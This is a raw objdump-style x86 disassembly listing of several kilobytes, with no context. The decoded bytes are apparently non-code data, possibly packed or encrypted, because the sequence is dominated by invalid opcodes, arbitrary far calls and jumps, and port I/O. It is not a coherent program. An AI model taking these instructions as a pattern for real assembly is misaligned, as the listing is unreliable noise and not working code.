  42a52e:	sub    esi,DWORD PTR [esi]
  42a530:	pushf  
  42a531:	call   0x8476:0xd329545b
  42a538:	sub    al,0xb8
  42a53a:	xchg   edx,eax
  42a53b:	stos   BYTE PTR es:[edi],al
  42a53c:	loop   0x42a574
  42a53e:	jae    0x42a559
  42a540:	data16 cli 
  42a542:	int3   
  42a543:	and    esi,DWORD PTR [edi+ecx*1]
  42a546:	jge    0x42a586
  42a548:	push   ecx
  42a549:	or     DWORD PTR [edx+0x41],ebx
  42a54c:	or     ebp,ebp
  42a54e:	mov    DWORD PTR [esi+0x42],eax
  42a551:	adc    BYTE PTR [ecx-0x46],cl
  42a554:	pop    esi
  42a555:	xchg   edx,eax
  42a556:	add    al,0xc3
  42a558:	inc    ebx
  42a559:	ins    DWORD PTR es:[edi],dx
  42a55a:	pop    esi
  42a55b:	fdivr  st(5),st
  42a55d:	shl    DWORD PTR [eax],1
  42a55f:	dec    edx
  42a560:	aas    
  42a561:	sbb    BYTE PTR [edi+0x26],al
  42a564:	xchg   ecx,eax
  42a565:	lds    esi,FWORD PTR [ebx+0x13aae217]
  42a56b:	jo     0x42a573
  42a56d:	jp     0x42a595
  42a56f:	pusha  
  42a570:	sbb    DWORD PTR [edx],edi
  42a572:	jg     0x42a53a
  42a574:	or     ch,BYTE PTR [edi]
  42a576:	mov    ds:0x4ec0040,al
  42a57b:	popa   
  42a57c:	out    dx,eax
  42a57d:	scas   al,BYTE PTR es:[edi]
  42a57e:	adc    eax,0xb3cbe7a
  42a583:	xor    DWORD PTR [esi-0x18],0x3d13d894
  42a58a:	push   ecx
  42a58b:	les    ebp,FWORD PTR [eax+0x0]
  42a58e:	jmp    0x42a56b
  42a590:	cmp    al,0x8
  42a592:	or     DWORD PTR [edx+0x6089ab4f],eax
  42a598:	test   BYTE PTR [ebx+ebp*1],cl
  42a59b:	shl    esi,0xc7
  42a59e:	(bad)  
  42a59f:	mov    WORD PTR [eax+0x36c0ea3e],fs
  42a5a5:	xor    dh,dl
  42a5a7:	and    eax,DWORD PTR [edi]
  42a5a9:	out    0x70,al
  42a5ab:	mov    bh,BYTE PTR [esi+0x13e8bd70]
  42a5b1:	dec    eax
  42a5b2:	xor    edx,DWORD PTR [eax+0x20]
  42a5b5:	mov    ebx,0xc56280ed
  42a5ba:	mov    ecx,0xd2050da2
  42a5bf:	nop
  42a5c0:	jns    0x42a5d4
  42a5c2:	sbb    BYTE PTR [ebp-0x7f96feda],ch
  42a5c8:	ret    
  42a5c9:	sub    DWORD PTR [ecx],ebx
  42a5cb:	jge    0x42a5f1
  42a5cd:	icebp  
  42a5ce:	add    al,0x71
  42a5d0:	inc    edx
  42a5d1:	fldz   
  42a5d3:	(bad)  
  42a5d4:	clc    
  42a5d5:	inc    edx
  42a5d6:	push   cs
  42a5d7:	pop    ds
  42a5d8:	imul   edx,DWORD PTR [ebx+0x60],0xd
  42a5dc:	sti    
  42a5dd:	adc    BYTE PTR [ebx-0x596b0a41],ah
  42a5e3:	icebp  
  42a5e4:	xchg   ebx,eax
  42a5e6:	inc    ebp
  42a5e7:	adc    eax,0x233809d6
  42a5ec:	push   eax
  42a5ed:	rcl    BYTE PTR [esp+esi*8],0x5c
  42a5f1:	ja     0x42a579
  42a5f3:	xor    al,0xc6
  42a5f5:	xor    BYTE PTR ds:0xb1a7142f,cl
  42a5fb:	mov    dl,0x4d
  42a5fd:	(bad)  
  42a5fe:	adc    DWORD PTR [edx],eax
  42a600:	out    dx,al
  42a601:	out    dx,eax
  42a602:	(bad)  
  42a603:	lahf   
  42a604:	addr16 mov ebx,0x8b22d8d5
  42a60a:	imul   esp,DWORD PTR [esp+ecx*8],0xffffffda
  42a60e:	ret    0xf332
  42a611:	mov    eax,DWORD PTR [eax+0xe]
  42a614:	jmp    0x42a67e
  42a616:	or     BYTE PTR [eax+0x76],0xa1
  42a61a:	dec    eax
  42a61b:	adc    esi,DWORD PTR [ebp+ecx*4-0x136c9d92]
  42a622:	js     0x42a5d0
  42a624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a625:	or     eax,0x1bf8740d
  42a62a:	cmp    ebp,DWORD PTR [ebp+0x78]
  42a62d:	stc    
  42a62e:	loopne 0x42a642
  42a630:	ss jns 0x42a680
  42a633:	mov    BYTE PTR [eax+0x55],cl
  42a636:	sbb    al,0x48
  42a638:	retf   0x4fe8
  42a63b:	xlat   BYTE PTR ds:[ebx]
  42a63c:	mov    al,0xae
  42a63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a63f:	push   cs
  42a640:	jecxz  0x42a667
  42a642:	sbb    bh,BYTE PTR [ebx+0x3e]
  42a645:	stos   DWORD PTR es:[edi],eax
  42a646:	test   BYTE PTR [esi+0x30],0xdb
  42a64a:	ins    DWORD PTR es:[edi],dx
  42a64b:	test   al,0x64
  42a64d:	mov    bl,0xaa
  42a64f:	punpcklwd mm5,DWORD PTR [esi-0xa0a3868]
  42a656:	push   ss
  42a657:	xchg   ebp,eax
  42a658:	(bad)  
  42a659:	sti    
  42a65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a65b:	js     0x42a66a
  42a65d:	lods   eax,DWORD PTR ds:[esi]
  42a65e:	mov    ah,0x41
  42a660:	mov    edx,0x4b241602
  42a665:	test   BYTE PTR [esp+eiz*2],ch
  42a668:	xor    esi,DWORD PTR [esi+0x57956405]
  42a66e:	cs inc edx
  42a670:	(bad)  
  42a672:	int3   
  42a673:	push   esp
  42a674:	or     DWORD PTR ds:0x386e9f32,esp
  42a67a:	ds or  eax,0x1786b94f
  42a680:	mov    al,ds:0xc5880173
  42a685:	data16 mov ds:0x36ae0cd4,al
  42a68b:	xchg   DWORD PTR [eax],ebx
  42a68d:	retf   0x70c3
  42a690:	loopne 0x42a64b
  42a692:	mov    ah,0x97
  42a694:	mov    bl,0x0
  42a696:	mov    ecx,0xbb171815
  42a69b:	xor    BYTE PTR [ecx-0x6064bfba],ch
  42a6a1:	add    al,0xf4
  42a6a3:	xchg   esp,eax
  42a6a4:	pusha  
  42a6a5:	dec    esi
  42a6a6:	mov    DWORD PTR ds:0x671ee66,esi
  42a6ac:	sbb    eax,0x32dc5c9b
  42a6b1:	int3   
  42a6b2:	or     ebx,DWORD PTR [ebp-0x41744da5]
  42a6b8:	loopne 0x42a6c9
  42a6ba:	pop    edx
  42a6bb:	loope  0x42a72c
  42a6bd:	icebp  
  42a6be:	pusha  
  42a6bf:	pusha  
  42a6c0:	stos   BYTE PTR es:[edi],al
  42a6c1:	sbb    BYTE PTR [esi+0x576c8298],0x3
  42a6c8:	sub    al,0xf9
  42a6ca:	add    bl,BYTE PTR [esi]
  42a6cc:	daa    
  42a6cd:	xchg   ebx,eax
  42a6ce:	data16 mov al,ds:0x13d38558
  42a6d4:	ret    0xd31d
  42a6d7:	dec    ecx
  42a6d8:	js     0x42a6ad
  42a6da:	jns    0x42a6b4
  42a6dc:	push   esi
  42a6dd:	inc    ebp
  42a6de:	xor    edx,edx
  42a6e0:	jmp    0x144:0xf1b64353
  42a6e7:	mov    ds:0x84f033a3,eax
  42a6ec:	bound  ebp,QWORD PTR [eax]
  42a6ee:	adc    al,0x2a
  42a6f0:	test   al,0xb3
  42a6f2:	adc    eax,0x55f0ea54
  42a6f7:	xor    al,0x7f
  42a6f9:	lahf   
  42a6fa:	int3   
  42a6fb:	retf   0xd248
  42a6fe:	add    BYTE PTR [esi-0x3d],bl
  42a701:	mov    dl,0x9
  42a703:	rcr    BYTE PTR [ecx+eax*4+0x6bcb04ec],0x42
  42a70b:	retf   
  42a70c:	sub    ah,al
  42a70e:	mov    WORD PTR [eax+ecx*2-0x14],cs
  42a712:	das    
  42a713:	jno    0x42a756
  42a715:	out    dx,eax
  42a716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a717:	ror    al,0x86
  42a71a:	psrlw  mm1,0x20
  42a71e:	sbb    BYTE PTR ds:0x62a515e8,dl
  42a724:	pushf  
  42a725:	int3   
  42a726:	sbb    al,0x2d
  42a728:	adc    BYTE PTR [ebx+0x27248ae8],dh
  42a72e:	mov    al,0x22
  42a730:	add    BYTE PTR [esi+0x5d582d94],cl
  42a736:	sub    ebx,esp
  42a738:	jno    0x42a76c
  42a73a:	cdq    
  42a73b:	sti    
  42a73c:	call   0x5a97b0f
  42a741:	stos   DWORD PTR es:[edi],eax
  42a742:	call   0x6d18b6d7
  42a747:	sub    BYTE PTR [edx+0x17ca9929],dl
  42a74d:	xchg   ecx,eax
  42a74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a74f:	sbb    ecx,DWORD PTR [ebp+0x65]
  42a752:	dec    edx
  42a753:	xor    BYTE PTR [ecx+0x3418d840],dl
  42a759:	loope  0x42a7b7
  42a75b:	mov    esp,0x8cdbbf00
  42a760:	jnp    0x42a72e
  42a762:	es cmp al,0x27
  42a765:	xchg   ebx,eax
  42a766:	dec    ecx
  42a767:	loopne 0x42a780
  42a769:	cld    
  42a76a:	xchg   edx,eax
  42a76b:	or     al,BYTE PTR [edx]
  42a76d:	out    0x65,al
  42a76f:	mov    esi,0xf1191cc8
  42a774:	mov    ebx,DWORD PTR [ecx-0x504ec1c4]
  42a77a:	push   ds
  42a77b:	mov    ebx,0x3255c6e8
  42a780:	xchg   ebx,eax
  42a781:	adc    ecx,DWORD PTR [ebx]
  42a783:	sub    DWORD PTR [edi+esi*2],edi
  42a786:	imul   esp,DWORD PTR gs:0xfb5e6811,0x92d6d059
  42a791:	sbb    eax,0x57bd62a0
  42a796:	pushf  
  42a797:	add    dh,0x56
  42a79a:	inc    edi
  42a79b:	mov    esp,0x6f7ec6d8
  42a7a0:	fsub   st(6),st
  42a7a2:	push   0x6f06bd1f
  42a7a7:	jmp    0x6f6e:0x2cf1d1c2
  42a7ae:	jbe    0x42a758
  42a7b0:	popf   
  42a7b1:	pop    ebp
  42a7b2:	pushf  
  42a7b3:	popa   
  42a7b4:	mov    dl,0x69
  42a7b6:	leave  
  42a7b7:	jle    0x42a7b0
  42a7b9:	ja     0x42a833
  42a7bb:	jo     0x42a7a3
  42a7bd:	enter  0x5e20,0x24
  42a7c1:	in     eax,dx
  42a7c2:	test   dh,0x21
  42a7c5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  42a7c7:	das    
  42a7c8:	sti    
  42a7c9:	mov    ch,0x61
  42a7cb:	xchg   ecx,eax
  42a7cc:	retf   0xe129
  42a7cf:	dec    ecx
  42a7d0:	fimul  DWORD PTR [esi]
  42a7d2:	adc    eax,0x9a1186c9
  42a7d7:	cmc    
  42a7d8:	jne    0x42a775
  42a7da:	jmp    0x42a84c
  42a7dc:	jno    0x42a784
  42a7de:	mov    ch,BYTE PTR [edi]
  42a7e0:	lods   al,BYTE PTR ds:[esi]
  42a7e1:	mov    bl,0xe0
  42a7e3:	pop    es
  42a7e4:	out    0xca,eax
  42a7e6:	cwde   
  42a7e7:	daa    
  42a7e8:	sbb    esi,edi
  42a7ea:	mov    BYTE PTR [esi+0x3b],0x5e
  42a7ee:	sbb    al,0x4e
  42a7f0:	ret    0x1a49
  42a7f3:	cmc    
  42a7f4:	fmul   QWORD PTR [ecx+eax*1+0x3f]
  42a7f8:	mov    edx,0x13e383d1
  42a7fd:	pop    sp
  42a7ff:	fwait
  42a800:	retf   0x21a3
  42a803:	cmp    ecx,DWORD PTR [edi+0xcde0837]
  42a809:	sub    dl,BYTE PTR [edi+0x7b]
  42a80c:	ss pop ecx
  42a80e:	mov    ds:0xa0170673,al
  42a813:	cmp    ebp,DWORD PTR [eax+0x58]
  42a816:	ret    0xd3b3
  42a819:	or     DWORD PTR [ecx],0x41
  42a81c:	mov    bl,dl
  42a81e:	fdivr  DWORD PTR [eax]
  42a820:	jecxz  0x42a7ee
  42a822:	push   0x10
  42a824:	jle    0x42a874
  42a826:	ret    
  42a827:	inc    esi
  42a828:	out    0xae,al
  42a82a:	cmp    esp,ebp
  42a82c:	fldenv [esi+0x4]
  42a82f:	push   eax
  42a830:	pop    es
  42a831:	(bad)  [edx+ebp*8]
  42a834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a835:	xchg   ebp,eax
  42a836:	aas    
  42a837:	sub    ch,BYTE PTR ds:0xe9c98bcf
  42a83d:	(bad)  
  42a83e:	stc    
  42a83f:	jmp    0x42a7fc
  42a841:	mov    al,0x69
  42a843:	das    
  42a844:	sub    eax,0xcced8d26
  42a849:	rcr    DWORD PTR [esi+edx*2],0x91
  42a84d:	data16 lahf 
  42a84f:	es pop ebx
  42a851:	jne    0x42a7e3
  42a853:	ss jmp 0xa39a:0x9b1574a5
  42a85b:	cmp    BYTE PTR [esi+0x52],cl
  42a85e:	pop    ebp
  42a85f:	hlt    
  42a860:	retf   0x5933
  42a863:	imul   esp,DWORD PTR [ebx+0x54],0x60072a6b
  42a86a:	xchg   BYTE PTR [eax-0x23],ah
  42a86d:	push   0xffffff9f
  42a86f:	test   ch,ch
  42a871:	jne    0x42a8c1
  42a873:	mov    esp,0xc4ff3049
  42a878:	pop    esp
  42a879:	or     DWORD PTR [edi+0x27],ebp
  42a87c:	mov    BYTE PTR [ebx],bh
  42a87e:	das    
  42a87f:	push   edi
  42a880:	adc    BYTE PTR [edi-0x74bc8233],ah
  42a886:	popf   
  42a887:	ss mov edx,0x8d629984
  42a88d:	ins    BYTE PTR es:[edi],dx
  42a88e:	les    ebx,FWORD PTR [edx]
  42a890:	sub    ah,BYTE PTR [esi+eiz*1-0x23]
  42a894:	je     0x42a8f5
  42a896:	aaa    
  42a897:	call   0x9274:0xcc30e3fe
  42a89e:	imul   DWORD PTR [ebx+0x42]
  42a8a1:	jno    0x42a8f9
  42a8a3:	jnp    0x42a916
  42a8a5:	outs   dx,DWORD PTR ds:[esi]
  42a8a6:	clc    
  42a8a7:	stos   BYTE PTR es:[edi],al
  42a8a8:	mov    dh,0x1
  42a8aa:	stos   BYTE PTR es:[edi],al
  42a8ab:	fisub  DWORD PTR [esi-0x1c88231b]
  42a8b1:	add    DWORD PTR [esi+0x5a],esp
  42a8b4:	je     0x42a8c4
  42a8b6:	cmc    
  42a8b7:	jno    0x42a8e5
  42a8b9:	pushf  
  42a8ba:	in     eax,dx
  42a8bb:	jg     0x42a933
  42a8bd:	cwde   
  42a8be:	jno    0x42a888
  42a8c0:	mov    ebx,ecx
  42a8c2:	jbe    0x42a8dc
  42a8c4:	sub    DWORD PTR [ecx],ebx
  42a8c6:	mov    ch,0x64
  42a8c8:	shl    BYTE PTR [eax],1
  42a8ca:	xchg   edi,eax
  42a8cb:	popa   
  42a8cc:	call   0x28dbfb9e
  42a8d1:	xchg   esp,eax
  42a8d2:	in     eax,dx
  42a8d3:	jecxz  0x42a8aa
  42a8d5:	dec    ebp
  42a8d6:	jbe    0x42a88d
  42a8d8:	xchg   edx,eax
  42a8d9:	ror    BYTE PTR [edi+0x17],cl
  42a8dc:	cmp    al,0xed
  42a8de:	repnz mov al,ds:0x469bcc95
  42a8e4:	inc    edi
  42a8e5:	sbb    DWORD PTR [ebx-0x22],esp
  42a8e8:	xor    BYTE PTR [esi-0x29f6cdf],bl
  42a8ee:	js     0x42a90c
  42a8f0:	fwait
  42a8f1:	or     DWORD PTR [ecx],edx
  42a8f3:	push   cs
  42a8f4:	je     0x42a93c
  42a8f6:	jo     0x42a8a4
  42a8f8:	and    eax,0x8aa56284
  42a8fd:	pop    es
  42a8fe:	ss mov eax,0xd6c8a720
  42a904:	aas    
  42a905:	mov    esp,0x9294708
  42a90a:	leave  
  42a90b:	push   ds
  42a90c:	xchg   BYTE PTR [ebp-0x29512c30],bl
  42a912:	gs pop edx
  42a914:	mov    dh,0x81
  42a916:	sub    ebp,DWORD PTR [ecx]
  42a918:	jl     0x42a8d8
  42a91a:	xchg   esp,eax
  42a91b:	inc    ebp
  42a91c:	mov    al,BYTE PTR [esi]
  42a91e:	sub    al,0x10
  42a920:	adc    ebx,esi
  42a922:	inc    edi
  42a923:	sbb    bh,BYTE PTR [ebx-0x4e96e4b9]
  42a929:	fld    st(6)
  42a92b:	addr16 mov eax,0xae4c8ecf
  42a931:	xchg   ebp,eax
  42a932:	ja     0x42a94d
  42a934:	ds ret 
  42a936:	jmp    0xb261160a
  42a93b:	and    al,0xac
  42a93e:	ror    BYTE PTR [eax],0xae
  42a941:	scas   al,BYTE PTR es:[edi]
  42a942:	das    
  42a943:	adc    DWORD PTR [ebx-0x1d],edi
  42a946:	mov    eax,ds:0x846a331e
  42a94b:	pop    edx
  42a94c:	fsub   QWORD PTR [ecx-0x1d98e9f8]
  42a952:	clc    
  42a953:	pop    ecx
  42a954:	fiadd  DWORD PTR [ecx-0x208a58a]
  42a95a:	xor    al,0xe8
  42a95c:	jl     0x42a8e7
  42a95e:	mov    WORD PTR [ecx-0x45],es
  42a961:	mov    ebp,?
  42a963:	pop    esi
  42a964:	sub    esi,edx
  42a966:	and    al,0xf0
  42a968:	(bad)  
  42a969:	in     al,0x2c
  42a96b:	fcomp  DWORD PTR [edx-0x11]
  42a96e:	(bad)  
  42a96f:	cdq    
  42a970:	mov    ecx,0xc0fbda8c
  42a975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a976:	aam    0x70
  42a978:	sub    eax,0x3f910709
  42a97d:	and    edx,ebx
  42a97f:	jmp    0x42a9b6
  42a981:	fld    TBYTE PTR [eax+edi*2]
  42a984:	popf   
  42a985:	xchg   esp,eax
  42a986:	add    BYTE PTR [ebp+0x775162cc],0xd2
  42a98d:	in     al,0x34
  42a98f:	jecxz  0x42a959
  42a991:	xchg   edx,eax
  42a992:	or     eax,0x19058701
  42a997:	adc    bl,BYTE PTR [edx+0x3767c8f]
  42a99d:	cmp    cl,bh
  42a99f:	das    
  42a9a0:	mov    al,ds:0xa981397c
  42a9a5:	lds    esi,FWORD PTR [esi+ecx*1]
  42a9a8:	mov    fs,WORD PTR [ebp-0x6d3ed7aa]
  42a9ae:	sar    BYTE PTR [ecx],1
  42a9b0:	and    bl,cl
  42a9b2:	loope  0x42a97f
  42a9b4:	mov    eax,ds:0x6004d55b
  42a9b9:	dec    ecx
  42a9ba:	push   esi
  42a9bb:	ss dec eax
  42a9bd:	inc    ebp
  42a9be:	dec    esi
  42a9bf:	out    0xe0,al
  42a9c1:	sbb    ch,BYTE PTR [edi+0x21]
  42a9c4:	add    BYTE PTR [ebx+eiz*1+0x3af4adf0],al
  42a9cb:	jp     0x42aa4a
  42a9cd:	cmp    ebp,DWORD PTR [esi]
  42a9cf:	dec    edi
  42a9d0:	out    0xb1,eax
  42a9d2:	cdq    
  42a9d3:	push   ds
  42a9d4:	lods   al,BYTE PTR ds:[esi]
  42a9d5:	jnp    0x42a96a
  42a9d7:	pop    ds
  42a9d8:	or     DWORD PTR [edx],edi
  42a9da:	cld    
  42a9db:	repnz push edx
  42a9dd:	or     DWORD PTR [ecx+0x33e22f6e],esi
  42a9e3:	sub    DWORD PTR [edi+ecx*1+0x5f41c0cc],edx
  42a9ea:	je     0x42a9bc
  42a9ec:	outs   dx,BYTE PTR ds:[esi]
  42a9ed:	lock xchg ecx,eax
  42a9ef:	sbb    BYTE PTR [edx+0x62b84936],dh
  42a9f5:	daa    
  42a9f6:	sti    
  42a9f7:	cs addr16 xchg ch,bl
  42a9fb:	push   0x41
  42a9fd:	mov    eax,ds:0x512d823b
  42aa02:	adc    ebx,DWORD PTR [edx]
  42aa04:	or     DWORD PTR [ecx-0x2c],eax
  42aa07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa08:	sub    edi,eax
  42aa0a:	mov    bh,0x57
  42aa0c:	pop    ss
  42aa0d:	rcr    BYTE PTR [ebx],1
  42aa0f:	jne    0x42aa22
  42aa11:	adc    dl,BYTE PTR [eax+0x70]
  42aa14:	jp     0x42aa50
  42aa16:	adc    ecx,0xffffffa5
  42aa19:	sbb    al,0x49
  42aa1b:	inc    edx
  42aa1c:	or     DWORD PTR [edi+0x75],edi
  42aa1f:	jae    0x42aa28
  42aa21:	outs   dx,BYTE PTR ds:[esi]
  42aa22:	enter  0x922e,0x19
  42aa26:	xor    DWORD PTR [edi+0x1cfc1a09],ecx
  42aa2c:	lods   eax,DWORD PTR ds:[esi]
  42aa2d:	mov    BYTE PTR ds:0xc74d6ae5,0x9
  42aa34:	das    
  42aa35:	jns    0x42aa93
  42aa37:	or     eax,0xe36439fd
  42aa3c:	test   BYTE PTR [esi-0x3ed63903],bl
  42aa42:	dec    esp
  42aa43:	pextrw esi,mm1,0x68
  42aa47:	fistp  DWORD PTR [edi-0x4a593d3]
  42aa4d:	sub    al,0xb3
  42aa4f:	or     esi,ecx
  42aa51:	push   es
  42aa52:	imul   edx,eax,0xbda627e6
  42aa58:	(bad)  
  42aa59:	fst    DWORD PTR [ecx-0x5a5dbd15]
  42aa5f:	pop    ss
  42aa60:	(bad)  [edi]
  42aa62:	push   ss
  42aa63:	mov    BYTE PTR [ecx-0xd21ff1a],0xe9
  42aa6a:	push   es
  42aa6b:	fdivr  DWORD PTR [edx+0x2d]
  42aa6e:	cmp    bh,dh
  42aa70:	aaa    
  42aa71:	xor    edi,DWORD PTR [eax]
  42aa73:	aad    0xbf
  42aa75:	mov    BYTE PTR [ecx+ecx*1],al
  42aa78:	mov    edi,0x4e3c4216
  42aa7d:	mov    bl,0x19
  42aa7f:	imul   edx,ecx,0x79b490f3
  42aa85:	sub    bl,BYTE PTR [ebp-0x4f7b7a3f]
  42aa8b:	imul   DWORD PTR ds:0x8279cb90
  42aa91:	dec    BYTE PTR [edx]
  42aa93:	out    dx,al
  42aa94:	and    al,0x73
  42aa96:	out    0xa5,eax
  42aa98:	leave  
  42aa99:	cmp    al,0x16
  42aa9b:	dec    edx
  42aa9c:	dec    esi
  42aa9d:	fsubr  DWORD PTR [edx+0x79]
  42aaa0:	je     0x42aa75
  42aaa2:	jmp    0x24bc:0xf5049c07
  42aaa9:	cmc    
  42aaaa:	add    eax,0xbfc5a2ca
  42aaaf:	inc    esp
  42aab0:	ficom  DWORD PTR [edx+0x56]
  42aab3:	int3   
  42aab4:	fsubr  st,st(0)
  42aab6:	xchg   edi,eax
  42aab7:	adc    BYTE PTR [ebp+0x68],bh
  42aaba:	add    esp,DWORD PTR [edx]
  42aabc:	pop    ds
  42aabd:	jg     0x42aadd
  42aabf:	or     ch,BYTE PTR [ebp-0x4e]
  42aac2:	call   ecx
  42aac4:	xor    al,0xdd
  42aac6:	pushf  
  42aac7:	mov    dh,0xe1
  42aac9:	cmp    ebp,esi
  42aacb:	xor    eax,0x7813ab8e
  42aad0:	push   0xffffff86
  42aad2:	jne    0x42ab0a
  42aad4:	mov    dh,0xc
  42aad6:	arpl   di,bx
  42aad8:	add    BYTE PTR [edi+0x9],ah
  42aadb:	mov    dl,0xa6
  42aadd:	jae    0x42ab21
  42aadf:	test   DWORD PTR [ecx],0x872fe970
  42aae5:	pop    ss
  42aae6:	sbb    DWORD PTR [esi],ebp
  42aae8:	jnp    0x42ab5a
  42aaea:	jne    0x42aa6f
  42aaec:	adc    DWORD PTR [esi],esp
  42aaee:	or     ch,ah
  42aaf0:	push   0x31abd312
  42aaf5:	retf   
  42aaf6:	sar    BYTE PTR [edx-0x65f1fa58],cl
  42aafc:	pop    ecx
  42aafe:	lods   al,BYTE PTR ds:[esi]
  42aaff:	call   0xaca3cf0c
  42ab04:	xor    eax,0x178edf86
  42ab09:	mov    al,0xd7
  42ab0b:	sub    esp,DWORD PTR [ecx+0x1f636c93]
  42ab11:	sbb    eax,0x85c06482
  42ab16:	mov    ds:0x3431ebab,eax
  42ab1b:	xchg   edi,eax
  42ab1c:	ret    
  42ab1d:	fstp   TBYTE PTR [edx+0x7c]
  42ab20:	nop
  42ab21:	or     BYTE PTR [edx-0x62],al
  42ab24:	lahf   
  42ab25:	sub    ah,BYTE PTR [edx+0x28]
  42ab28:	pop    ecx
  42ab29:	inc    esi
  42ab2a:	sub    al,0xe8
  42ab2c:	inc    esi
  42ab2d:	outs   dx,BYTE PTR ds:[esi]
  42ab2e:	jp     0x42ab4c
  42ab30:	sub    DWORD PTR [ecx],ebp
  42ab32:	sbb    BYTE PTR [ebx-0x6fd76246],0x10
  42ab39:	cmc    
  42ab3a:	xchg   edx,eax
  42ab3b:	add    al,ch
  42ab3d:	xchg   edx,eax
  42ab3e:	fs in  al,dx
  42ab40:	in     al,dx
  42ab41:	lahf   
  42ab42:	inc    ecx
  42ab43:	jb     0x42abaf
  42ab45:	pop    ecx
  42ab46:	add    BYTE PTR [eax+ebp*2-0x347511d1],cl
  42ab4d:	std    
  42ab4e:	icebp  
  42ab4f:	mov    eax,0x3c3b09b1
  42ab54:	(bad)  
  42ab56:	imul   ebp,DWORD PTR [edi+esi*4-0x52],0x40
  42ab5b:	scas   eax,DWORD PTR es:[edi]
  42ab5c:	fwait
  42ab5d:	loopne 0x42aae2
  42ab5f:	pop    edi
  42ab60:	or     DWORD PTR [esi+0x30d9588c],0x4a
  42ab67:	out    0xfe,al
  42ab69:	sbb    DWORD PTR [ecx],esi
  42ab6b:	call   0xb9b21ef5
  42ab70:	mov    esi,edx
  42ab72:	cli    
  42ab73:	jb     0x42ab83
  42ab75:	pop    ecx
  42ab76:	mov    bh,0x3
  42ab78:	lds    eax,FWORD PTR [ebp+0x18205e22]
  42ab7e:	out    dx,eax
  42ab7f:	jae    0x42abb9
  42ab81:	icebp  
  42ab82:	mov    ebx,0xc3dfea92
  42ab87:	ds inc edx
  42ab89:	ja     0x42ab88
  42ab8b:	test   DWORD PTR [edx-0x122613b6],esi
  42ab91:	not    DWORD PTR [eax]
  42ab93:	retf   0xe2b3
  42ab96:	or     eax,0x34bdbc3a
  42ab9b:	aaa    
  42ab9c:	rol    DWORD PTR [ebp+0x5],cl
  42ab9f:	jnp    0x42ab8b
  42aba1:	and    al,0xe4
  42aba3:	or     dh,cl
  42aba5:	push   edi
  42aba6:	call   0x31d6afe6
  42abab:	pop    edx
  42abac:	xchg   esp,eax
  42abad:	ror    BYTE PTR [eax+0xf],1
  42abb0:	jp     0x42abe3
  42abb2:	pop    edi
  42abb3:	push   ebx
  42abb4:	imul   esp,ebp,0xfdf06845
  42abba:	imul   eax,DWORD PTR [edx+0x18],0xffffff9d
  42abbe:	scas   eax,DWORD PTR es:[edi]
  42abbf:	pusha  
  42abc0:	iret   
  42abc1:	dec    ebp
  42abc2:	dec    ebp
  42abc3:	mov    eax,0x2d445adf
  42abc8:	dec    ecx
  42abc9:	call   0x5e6794b7
  42abce:	popf   
  42abcf:	int3   
  42abd0:	pop    esp
  42abd1:	and    eax,0x2e54d800
  42abd6:	imul   edi,DWORD PTR [ebx-0x7d],0xffffffd7
  42abda:	pop    edx
  42abdb:	lea    eax,[edx]
  42abdd:	push   esp
  42abde:	or     eax,0x3236c213
  42abe3:	fcmovne st,st(1)
  42abe5:	push   ecx
  42abe6:	dec    ebp
  42abe7:	or     BYTE PTR [eax+ebp*2+0x1b],dh
  42abeb:	pop    esi
  42abec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abed:	add    DWORD PTR [edi+0x50ab6de],edx
  42abf3:	sbb    BYTE PTR [edi],0xa6
  42abf6:	ins    BYTE PTR es:[edi],dx
  42abf7:	adc    eax,0x11d9736
  42abfc:	mov    edi,0x59d5e90c
  42ac01:	enter  0x421b,0xc8
  42ac05:	out    0xaa,eax
  42ac07:	test   al,0x91
  42ac09:	adc    BYTE PTR [eax+0x75a00fae],dh
  42ac0f:	jl     0x42ac2d
  42ac11:	in     eax,0x71
  42ac13:	sbb    DWORD PTR [edi-0x6a71d8dc],eax
  42ac19:	inc    ebp
  42ac1a:	cmc    
  42ac1b:	call   0xf182:0x1934c319
  42ac22:	imul   DWORD PTR [ebp-0x21ab4e8c]
  42ac28:	test   DWORD PTR [ecx],ebp
  42ac2a:	fidivr DWORD PTR [ebx+edi*8+0x4ef124af]
  42ac31:	mov    dl,0x5
  42ac33:	(bad)  
  42ac35:	out    0x36,al
  42ac37:	rcr    edi,cl
  42ac39:	popf   
  42ac3a:	dec    ebx
  42ac3b:	or     ebx,eax
  42ac3d:	inc    eax
  42ac3e:	add    ah,ch
  42ac40:	cmp    eax,0xbb304a7b
  42ac45:	call   0x9a3e:0x90244f60
  42ac4c:	mov    DWORD PTR [ebp+ecx*8-0x4d763c7a],0xd47fd0a
  42ac57:	or     ecx,edx
  42ac59:	fisttp QWORD PTR [esi-0x74]
  42ac5c:	cmp    eax,0xc1fc98ef
  42ac61:	or     edi,DWORD PTR ds:0x3a19a839
  42ac67:	push   esp
  42ac68:	popf   
  42ac69:	test   DWORD PTR [esi-0x604f35fe],ebx
  42ac6f:	adc    DWORD PTR [eax],eax
  42ac71:	jnp    0x42ac2a
  42ac73:	mov    ecx,0xced7206f
  42ac78:	jae    0x42ac98
  42ac7a:	add    edi,esi
  42ac7c:	dec    ebx
  42ac7d:	in     al,dx
  42ac7e:	aam    0xa4
  42ac80:	std    
  42ac81:	push   ds
  42ac82:	mov    ebx,0x8caf4109
  42ac87:	pop    esp
  42ac88:	xor    al,0x82
  42ac8a:	mov    ds:0xfadc7e75,eax
  42ac8f:	mov    ebx,DWORD PTR [esi-0x28]
  42ac92:	call   0xecf0:0x124588b
  42ac99:	dec    ebx
  42ac9a:	jno    0x42ac68
  42ac9c:	adc    bl,BYTE PTR [ebx+edi*4-0x53]
  42aca0:	lds    ecx,FWORD PTR [ecx+0x6382c98a]
  42aca6:	pop    ecx
  42aca7:	daa    
  42aca8:	push   0xffffffb5
  42acaa:	or     al,BYTE PTR [esi]
  42acac:	adc    bh,BYTE PTR [ecx-0x1c]
  42acaf:	stos   BYTE PTR es:[edi],al
